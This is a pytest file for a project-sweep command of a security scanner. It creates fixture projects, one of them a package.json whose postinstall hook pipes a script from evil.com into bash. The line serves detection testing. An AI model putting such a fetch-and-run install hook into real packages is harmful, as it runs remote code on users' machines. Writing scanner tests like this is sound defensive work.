# SPDX-License-Identifier: Apache-2.0
"""Tests for CLI sweep project command."""

import os
import tempfile
import json
import io
from contextlib import redirect_stdout, redirect_stderr
from policy_scout.cli.main import handle_sweep_project_command


def test_sweep_project_with_suspicious_package():
    """Test sweep project with suspicious package.json."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create package.json with suspicious postinstall
        package_json = {
            "name": "test-package",
            "scripts": {
                "postinstall": "curl https://evil.com/script.sh | bash",
            },
        }

        package_path = os.path.join(tmpdir, "package.json")
        with open(package_path, "w") as f:
            json.dump(package_json, f)

        # Run sweep and capture output
        stdout_capture = io.StringIO()
        with redirect_stdout(stdout_capture):
            handle_sweep_project_command(
                json_output=True,
                audit_enabled=False,
                project_root=tmpdir,
            )

        output = stdout_capture.getvalue()

        # Should produce JSON output
        assert output is not None
        assert len(output) > 0


def test_sweep_project_with_harmless_project():
    """Test sweep project with harmless project."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create harmless package.json
        package_json = {
            "name": "test-package",
            "scripts": {
                "test": "jest",
                "build": "webpack",
            },
        }

        package_path = os.path.join(tmpdir, "package.json")
        with open(package_path, "w") as f:
            json.dump(package_json, f)

        # Run sweep and capture output
        stdout_capture = io.StringIO()
        with redirect_stdout(stdout_capture):
            handle_sweep_project_command(
                json_output=True,
                audit_enabled=False,
                project_root=tmpdir,
            )

        output = stdout_capture.getvalue()

        # Should complete without error
        assert output is not None
        assert len(output) > 0


def test_sweep_project_with_executable():
    """Test sweep project with executable file."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create executable file
        script_path = os.path.join(tmpdir, "script.sh")
        with open(script_path, "w") as f:
            f.write("#!/bin/bash\necho 'hello'")
        os.chmod(script_path, 0o755)

        # Run sweep and capture output
        stdout_capture = io.StringIO()
        with redirect_stdout(stdout_capture):
            handle_sweep_project_command(
                json_output=True,
                audit_enabled=False,
                project_root=tmpdir,
            )

        output = stdout_capture.getvalue()

        # Should detect executable
        assert output is not None
        assert len(output) > 0


def test_sweep_project_with_github_workflow():
    """Test sweep project with GitHub Actions workflow."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create .github/workflows directory
        workflows_dir = os.path.join(tmpdir, ".github", "workflows")
        os.makedirs(workflows_dir)

        # Create workflow file
        workflow_path = os.path.join(workflows_dir, "ci.yml")
        with open(workflow_path, "w") as f:
            f.write("name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest")

        # Run sweep and capture output
        stdout_capture = io.StringIO()
        with redirect_stdout(stdout_capture):
            handle_sweep_project_command(
                json_output=True,
                audit_enabled=False,
                project_root=tmpdir,
            )

        output = stdout_capture.getvalue()

        # Should complete without error
        assert output is not None
        assert len(output) > 0


def test_sweep_project_with_js_file():
    """Test sweep project with JavaScript file."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create JS file
        js_path = os.path.join(tmpdir, "app.js")
        with open(js_path, "w") as f:
            f.write("function hello() { return 'world'; }")

        # Run sweep and capture output
        stdout_capture = io.StringIO()
        with redirect_stdout(stdout_capture):
            handle_sweep_project_command(
                json_output=True,
                audit_enabled=False,
                project_root=tmpdir,
            )

        output = stdout_capture.getvalue()

        # Should complete without error
        assert output is not None
        assert len(output) > 0


def test_sweep_project_with_shell_script():
    """Test sweep project with shell script."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create shell script
        script_path = os.path.join(tmpdir, "setup.sh")
        with open(script_path, "w") as f:
            f.write("#!/bin/bash\necho 'Hello, World!'")

        # Run sweep and capture output
        stdout_capture = io.StringIO()
        with redirect_stdout(stdout_capture):
            handle_sweep_project_command(
                json_output=True,
                audit_enabled=False,
                project_root=tmpdir,
            )

        output = stdout_capture.getvalue()

        # Should complete without error
        assert output is not None
        assert len(output) > 0


def test_sweep_project_with_credential_reference():
    """Test sweep project with credential reference."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create file with credential reference
        js_path = os.path.join(tmpdir, "config.js")
        with open(js_path, "w") as f:
            f.write("require('dotenv').config();")

        # Run sweep and capture output
        stdout_capture = io.StringIO()
        with redirect_stdout(stdout_capture):
            handle_sweep_project_command(
                json_output=True,
                audit_enabled=False,
                project_root=tmpdir,
            )

        output = stdout_capture.getvalue()

        # Should detect credential reference
        assert output is not None
        assert len(output) > 0


def test_sweep_project_with_malformed_json():
    """Test sweep project with malformed package.json."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create malformed package.json
        package_path = os.path.join(tmpdir, "package.json")
        with open(package_path, "w") as f:
            f.write("{ invalid json }")

        # Run sweep - should not crash
        stdout_capture = io.StringIO()
        stderr_capture = io.StringIO()
        with redirect_stdout(stdout_capture), redirect_stderr(stderr_capture):
            handle_sweep_project_command(
                json_output=True,
                audit_enabled=False,
                project_root=tmpdir,
            )

        output = stdout_capture.getvalue()

        # Should complete without error
        assert output is not None
        assert len(output) > 0


def test_sweep_project_uses_current_directory():
    """Test sweep project uses current directory when no path provided."""
    with tempfile.TemporaryDirectory() as tmpdir:
        # Change to temp directory
        original_cwd = os.getcwd()
        os.chdir(tmpdir)

        try:
            # Create harmless package.json
            package_json = {"name": "test-package"}
            package_path = os.path.join(tmpdir, "package.json")
            with open(package_path, "w") as f:
                json.dump(package_json, f)

            # Run sweep without project_root
            stdout_capture = io.StringIO()
            with redirect_stdout(stdout_capture):
                handle_sweep_project_command(
                    json_output=True,
                    audit_enabled=False,
                    project_root=None,
                )

            output = stdout_capture.getvalue()

            # Should complete without error
            assert output is not None
            assert len(output) > 0
        finally:
            os.chdir(original_cwd)
